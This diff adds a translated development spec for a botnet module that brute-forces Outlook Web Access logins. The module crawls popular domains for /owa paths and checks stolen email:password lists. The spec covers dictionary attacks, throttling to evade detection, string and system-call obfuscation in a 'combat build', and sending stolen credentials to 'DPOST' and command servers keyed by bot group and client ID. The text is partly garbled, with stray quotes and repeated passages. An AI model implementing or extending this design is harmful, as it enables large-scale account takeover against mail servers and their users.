@@ -1,0 +1,249 @@
+Sentence
+TASK FOR DEVELOPMENT OF OUTLOOK WEB ACCESS (OWA) PASSWORD MINING MODULE
+The purpose of the module is distributed password recovery for OWA.
+* Marking (postpone) means that this functionality does not need to be implemented yet.
+WORKING PRINCIPLE
+The module receives the following information from the server in the form of configs:
+- list of login:password for selection
+- list of settings
+- list of DPOST servers
+The module consists of two parts:
+- crawler
+- scanner
+The crawler generates the url to be checked.
+The scanner checks them.
+"The principle of the crawler: randomly traversing domains from the top 500,000 list like Alexa."
+The exact source of data for crawling is not clear yet - Alexa has a paid subscription.
+We need to find an alternative.
+s3.amazonaws.com/alexa-static/top-1m.csv.zip
+"For example, https://www.quantcast.com/top-sites/US/3"
+(set aside)
+Backup: work on a hard-coded list of sites retrieved from the server.
+"Next, the module:"
+1. takes the next site from the output of the crawler
+2. checks for the presence of the path /owa
+3. checks for the mail.domain.com/owa path
+4. checks for the webmail.domain.com/owa path.
+5.
+"if owa is not found on any path, goto 1"
+7. takes the next login:password pair from the dictionary
+8. sends an HTTP request for the login to owa.
+9.
+"if login fails, goto 7"
+10.
+"if successful, adds the found combination to the list of found logins as url|login|password"
+REALIZATION
+0.
+The name of the project is owa.
+"When implementing, the following should be done (the description of the algorithm is greatly simplified):"
+1. brute-force should be performed in multiple threads.
+It is up to the developer to choose a specific multithreading scheme.
+The following variant can be proposed:
+"* crawler works in one thread, all found urls are put into a queue (protected by mutex)."
+Scanning threads (the number is limited) take several urls for scanning from the queue (this is a variation of thread pooling).
+Each scan thread runs on H randomly selected sites from the list.
+"If the login fails, the next site is taken, and the current one is put at the end of the queue."
+"That is, the brute force is performed cyclically on H sites, so as not to give a peak load on one and the same site."
+"If a password is found for a site, it is removed from the queue."
+- the number of threads is set by compilation constant and configuration from the config
+- The module minimizes the number of connect() calls to open TCP connections.
+"Between iterations, the connection should be kept"
+open until the server closes it.
+"In this case, the connection should be re-opened."
+"If an attempt to reopen the connection fails twice in a row, attempts to connect to the given site are stopped for half an hour"
+(the constant is set at compile time).
+2. it is necessary to provide a delay in seconds between iterations of selection (also compilation constant and config setting).
+3. User-Agent should be configured.
+"It should be configured as a compilation constant,"
+and as a module setting.
+4.
+It should be provided that the site can react to cookies.
+"For example, refuse to work if it does not receive the cookie,"
+given on the original GET / HTTP/1.1
+5.
+"The module sends a list of found passwords once every H minutes (set by a compilation constant and configuration from the config),"
+provided that new passwords have been found since the previous sending.
+"Logic of sending and protocol are described in the document ""TOR of DPOST.txt password robbing"""
+"6. (postpone) if brute force does not yield results, start checking by dictionary."
+"The URL of dictionaries for downloading is taken from the ""list of settings"" config."
+7.
+The module is designed in accordance with the rules of module development (see modules_HOWTO.txt).
+8.
+The module sends the following events with the owa tag:
+"- ""Version build %DATE% %TIME%"" (once at startup)"
+"- ""OWA passwords sent to DPOST server"" on successful sending of collected passwords"
+"- ""OWA passwords send failure: servers unavailable"" when there are no DPOST servers available."
+"- ""No OWA passwords in range; trying dictionaries"" if the entire list is finished, nothing is found, and trying dictionaries is started."
+"- ""No OWA passwords; give up"" if dictionaries are searched and nothing is found."
+"In this case, the module should issue the WantRelease event (see ""module_HOWTO"") to unload from memory"
+9.
+"In this module you can use C++ STL (std::string, containers) in a limited way."
+It is forbidden to use std::mutex and synchronization primitives - for this purpose you can use only
+"WinAPI synchronization primitives (CRITICAL_SECTION, etc.)."
+10.
+"Obfuscate strings with Andrivet library (attached, see _"
+STR() macro).
+11.
+Obfuscate system calls with GetApi.h library.
+"Be careful, obfuscation of system calls may cause crashes."
+12.
+The module must have two versions - x32- and x64-bit.
+13.
+"In the combat build, lines should be obfuscated to the maximum and all debugging output should be disabled."
+14.
+The module must have a debug version.
+Debug output should be output to c:/temp/owa.log (the path to the log is configured in the macro).
+15.
+"The project must have a config.h settings file (the name is not important, it's the essence that matters - all global settings - paths, macros, conditional compilation switches, etc.)."
+16.
+The module should work on all modern versions of Windows.
+The minimum supported Windows version is Windows XP (if it is impossible - Windows Vista).
+17.
+The project must be designed for building in Microsoft Visual Studio not lower than 2015.
+18.
+The Visual Studio project must be configured as follows:
+* For ALL build profiles:
+- Output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\.
+- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\.
+- Multiprocessor Compilation:
+Yes
+* Release Profile:
+- Debugging Information Format (C/C++ code creation):
+no
+- Create debugging information (linker/debugging):
+no
+CONFIGS.
+"The name of the config is the Ctl argument of the Control function, the contents of the config is the CtlArg argument (see modules_HOWTO.txt)"
+All text in configs is case-sensitive; tags and service values must be lowercase.
+Configs must be in any single-byte encoding (preferably ASCII).
+XML comments are not allowed.
+* settings
+A config is a simple xml in the following format:
+<owa>
+"<delay>delay between matching iterations, in milliseconds</delay>"
+<threads>number of matching threads</threads>
+<nurl>number of urls checked by one thread (cyclically)</nurl>
+<ua>user agent</ua>
+(defer)<dict1>URL of additional dictionary 1</dict1>
+(postpone)<dict2>URL of additional dictionary 2</dict2>
+(postpone)<dict3>URL of additional dictionary 3</dict3>
+...
+<dictN>URL of additional dictionary N</dictN>
+</owa>
+All parameters from this config are optional.
+"If no parameter is specified, the compile time constant is used."
+* dpost
+The config is a simple xml in the following format:
+<dpost>
+<handler>http://11.22.33.44:8082</handler>
+<handler>127.0.0.1:8083</handler>
+</dpost>
+The http/https prefix to the handler is optional.
+"If it is specified, the specified protocol should be used."
+If it is not specified:
+"- if the port value is even, the operation is without encryption (HTTP), if the port is odd, the operation is over SSL/TLS (HTTPS)."
+The configuration contains a list of servers to which the results should be sent via DPOST protocol.
+"Send format: plain text; line separator - \r\n, field separator - '|' (vertical dash)."
+Record format:
+url|user|password\r\n
+* pw
+"List of ""username"" ""password"" pairs."
+The text is gzip packed.
+string format username|password\r\n
+(set aside) *
+sites
+"The configuration is a simple text list, line separator - characters \r\n"
+Each line - one domain name.
+It may or may not contain the protocol prefix http(s)://.
+"In this case, you should try both prefixes when brute-forcing."
+(defer) *
+dict
+"The dict is a simple text list, the line separator is \r\n characters."
+Each line is a login/password pair.
+The field delimiter is the '|' character (vertical dash).
+(ignore
+"The config is a simple text list, line delimiter - \r\n characters"
+Each line is a URL.
+This will include addresses of top sites like gmail.
+Addresses from this list should be ignored in the search.
+"This refers to the address of the current domain being scanned,"
+not the domain portion of the current email address being crawled.
+SECOND VERSION
+The main changes of the second version:
+- new verification mode
+- command server operation
+TEST MODE
+"In this mode, the module does not search for new passwords, but checks the existing database for relevance."
+"Accordingly, in this mode:"
+"- the scanner does not work according to the Alexa list, but takes the next email from the email:password dictionary as input"
+- OWA URL search algorithm is preserved (guessing urls of the webmail.domain.com/owa type)
+"- we check one specific email:password pair per domain (or rather, per guessed OWA URL of this domain)."
+"- we add the setting mode=check|brute, where check - check mode, brute - search and bruteforce mode (logic of the first version)."
+"Regarding configs and dictionaries, see below."
+COMMAND SERVER AND CONFIGS
+"Previously, we received all source data in the form of configs from the backend of bots."
+"This is quite inconvenient for various reasons - backend restrictions on config sizes,"
+"limitations on operator control of the configs, lack of a common network status,"
+lack of specialized storage for results.
+"Instead, a command server will be used, from which we ask for configs and input lists,"
+and to whom we give the loot.
+"Because of this, all configs from the first version are abolished."
+"There's a new srv config containing a list of control server addresses,"
+"separated by \r\n or \n, in address:port format."
+"If the port is even, the operation is HTTP, if odd - HTTPS."
+"If a protocol prefix is specified (http/https), the prefix takes precedence over the specified port."
+"The module works with the control server that was reached first, for each request."
+The operating mode can be obtained by HTTP-request to the server
+GET /<group>/<clientid>/owa/mode HTTP/1.1
+The group and clientid values are struct ParentInfo fields
+CHAR ParentID[256];
+CHAR ParentGroup[64];
+(see module_HOWTO)
+The module expects a brute or check string in the body of the HTTP response.
+Any other value is invalid - in this case the module makes repeated requests every 5 minutes; until it receives a correct one.
+"every 5 minutes; until a correct response is received, the module does not start its work."
+The scanner receives the list of domains to be checked by HTTP-request to the server
+Number of scanning threads:
+GET /<group>/<clientid>/owa/th HTTP/1.1
+The response is a non-negative number.
+"If atoi(response) == 0, then the default number of threads = std::thread_concurrency() - 1."
+GET /<group>/<clientid>/owa/domains HTTP/1.1
+Response format:
+address1[\r]\n
+domain2[\r]\n
+...
+(one or many entries)
+"When the enumeration of the given list is completed, we let the server know about it:"
+GET /<group>/<clientid>/owa/over HTTP/1.1
+The server's response is the same as to the /domains request - a new list of domains to work with.
+"In case of an unexpected response (empty list, error code, etc.)"
+the module goes to idle (scanning is stopped).
+and makes the same request once every 10 minutes (time is a constant).
+The dictionary for enumeration is obtained by HTTP-request to the control server:
+GET /<group>/<clientid>/owa/dict HTTP/1.1
+In response we get the dictionary either as text/plain or application/gzip (look at the Content-Type response header).
+"If the packing is gzip, then after unpacking we expect the same dictionary format as for plain text."
+Format:
+email:password[\r]\n
+"Sending is done via the DPOST protocol (see ""DPOST password rob TOR"" for a description of the protocol) with the following request"
+POST /<group>/<clientid>/owa/81
+HTTP/1.1
+The collected data is sent in a multipart/form-data container with source and data fields.
+"The value of the source field is ""OWA Passwords"""
+"Data field value: plain text, line separator \r\n."
+Record format:
+owa|url||<username>|<password>\r\n
+...
+(one or many entries)
+You can get the frequency of sending dummy data from the control server by HTTP request
+GET /<group>/<clientid>/owa/freq HTTP/1.1
+"In the body of the response we expect a number - this is the number of seconds, not more often than which the data should be sent."
+If it is 0 - we send it as soon as a new result is ready.
+"If it is a positive number - we accumulate records in the buffer and send once in X seconds,"
+clearing the buffer on successful sending.
+"When the enumeration of the issued list is completed, we let the server know about it:"
+GET /<group>/<clientid>/owa/over HTTP/1.1
+The server's response is the same as to the /domains request - a new list of domains to work with.
+"In case of an unexpected response (empty list, error code, etc.)"
+the module goes to idle (scanning is stopped).
+and makes the same request once every 10 minutes (time is a constant).
